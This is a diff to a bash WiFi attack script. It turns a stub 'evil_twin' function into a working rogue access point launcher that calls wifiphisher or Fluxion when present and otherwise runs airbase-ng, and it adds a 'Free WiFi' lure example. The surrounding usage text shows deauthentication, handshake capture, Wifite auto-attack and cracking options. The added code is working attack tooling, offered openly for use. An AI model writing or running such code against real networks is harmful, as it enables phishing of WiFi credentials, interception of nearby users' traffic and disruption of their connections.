@@ -172,18 +172,43 @@ deauth_attack() {
 # Evil Twin attack
 evil_twin() {
     local ssid="$1"
+    local channel="${2:-6}"
     
     if [[ -z "$ssid" ]]; then
-        log_error "Usage: $0 --evil-twin <SSID>"
+        log_error "Usage: $0 --evil-twin <SSID> [CHANNEL]"
         exit 1
     fi
     
-    log_info "Setting up Evil Twin AP: $ssid"
+    log_info "Setting up Evil Twin attack for: $ssid"
+
+    # Check for advanced tools first
+    if command -v wifiphisher &> /dev/null; then
+        log_info "Launching Wifiphisher for advanced Evil Twin attack..."
+        # wifiphisher requires interactive mode usually, but we try to pass ESSID
+        wifiphisher --essid "$ssid"
+        return
+    fi
     
-    # This is a basic implementation - expand as needed
-    log_warning "Evil Twin attack requires additional configuration"
-    log_info "Use tools like: hostapd, dnsmasq, iptables"
-    log_info "Or use: wifiphisher, fluxion for automated setup"
+    if [ -d "/opt/fluxion" ]; then
+        log_info "Found Fluxion. Launching..."
+        log_warning "Fluxion is interactive. Follow the on-screen prompts."
+        cd /opt/fluxion && ./fluxion.sh
+        return
+    fi
+
+    # Fallback to airbase-ng (Basic Soft AP)
+    log_info "Advanced tools (wifiphisher/fluxion) not found."
+    log_info "Starting Basic Evil Twin AP using airbase-ng..."
+    
+    enable_monitor_mode
+    
+    log_info "Broadcasting SSID: $ssid on channel $channel"
+    log_warning "This creates a fake AP. Clients may connect, but won't have internet access"
+    log_warning "without further IP checking/routing configuration."
+    log_warning "Press Ctrl+C to stop"
+    echo ""
+    
+    airbase-ng -e "$ssid" -c "$channel" "$MONITOR_INTERFACE"
 }
 
 # Crack captured handshake
@@ -221,7 +246,7 @@ ${YELLOW}Options:${NC}
   --handshake <BSSID> <CH>  Capture WPA handshake
   --auto-attack             Automated attack with Wifite
   --deauth <BSSID> [COUNT]  Deauth attack (0=continuous)
-  --evil-twin <SSID>        Create Evil Twin AP
+  --evil-twin <SSID> [CH]   Create Evil Twin AP (uses wifiphisher/fluxion if available)
   --crack <FILE> [DICT]     Crack captured handshake
   --monitor-on              Enable monitor mode
   --monitor-off             Disable monitor mode
@@ -232,6 +257,7 @@ ${YELLOW}Examples:${NC}
   sudo $0 --handshake AA:BB:CC:DD:EE:FF 6
   sudo $0 --auto-attack
   sudo $0 --deauth AA:BB:CC:DD:EE:FF 10
+  sudo $0 --evil-twin "Free WiFi" 6
   sudo $0 --crack ~/captures/handshake-01.cap
 
 ${YELLOW}Output Directory:${NC}
